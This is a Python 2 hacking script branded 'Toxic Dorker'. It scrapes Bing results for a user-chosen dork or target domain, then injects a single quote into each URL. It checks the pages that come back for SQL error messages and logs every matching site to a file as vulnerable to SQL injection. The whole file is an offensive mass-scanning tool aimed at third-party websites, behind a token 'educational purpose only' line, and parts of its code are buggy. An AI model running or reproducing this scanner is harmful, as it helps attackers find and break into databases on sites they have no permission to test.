#This tool is for educational purpose only
#Citoolkit.pw ,InterCuba.Net
import urllib
import os
import re
from time import sleep
import multiprocessing

def sqlihunt(dork , filename ):
   
  # extract Urls from a Bing search engin querying the given dork and test every url in 
  # the result is stored in a text file
  #Bing engine won't generally isp 
  dork= param1 
  file2 =open(filename+'.txt','w')
  start=0
  end = scans
  sleep(3)
  print "[info] Getting Websites From The World Wide Network "
  while start<=end :
    try:
      con = urllib.urlretrieve('https://www.bing.com/search?q='+dork+"&first="+str(start))
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
      #return find 
    except IOError:
      print "[ERROR]Network error "
      print "[Info] Trying to Reconnect"
      sleep(10)
      print "[Info]Retrying "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print "[SLQi Vulnerable!] : "+ rez 
                    file2.write(rez + '\n')
                  else:
                    print "[ NO SQLI :(  ] : " + rez
    except IOError:
      print "[ERROR]No result found"
##########################################################################################################################

print  """
 ________                    __                  _______                       __                           
|        \                  |  \                |       \                     |  \                          
 \$$$$$$$$______   __    __  \$$  _______       | $$$$$$$\  ______    ______  | $$   __   ______    ______  
   | $$  /      \ |  \  /  \|  \ /       \      | $$  | $$ /      \  /      \ | $$  /  \ /      \  /      \ 
   | $$ |  $$$$$$\ \$$\/  $$| $$|  $$$$$$$      | $$  | $$|  $$$$$$\|  $$$$$$\| $$_/  $$|  $$$$$$\|  $$$$$$\
   | $$ | $$  | $$  >$$  $$ | $$| $$            | $$  | $$| $$  | $$| $$   \$$| $$   $$ | $$    $$| $$   \$$
   | $$ | $$__/ $$ /  $$$$\ | $$| $$_____       | $$__/ $$| $$__/ $$| $$      | $$$$$$\ | $$$$$$$$| $$      
   | $$  \$$    $$|  $$ \$$\| $$ \$$     \      | $$    $$ \$$    $$| $$      | $$  \$$\ \$$     \| $$      
    \$$   \$$$$$$  \$$   \$$ \$$  \$$$$$$$       \$$$$$$$   \$$$$$$  \$$       \$$   \$$  \$$$$$$$ \$$      
_____________________________________________    ___________________________________________________________
"""                             

param1 = raw_input("(Relevant Keyword  Or Domain For Target (Example: '.com , .cu.gob, .net ')) : ")
print ("Ok...")
param2 = raw_input("Filename to save Results (Example: Target.txt) :  ")
print ("Ok...")
scans = raw_input ("Number of Pages on search engines you want to Scan For MySQL Vuls: ")
print("OK...")

sqlihunt(param1 , param2 )
print " ./done "
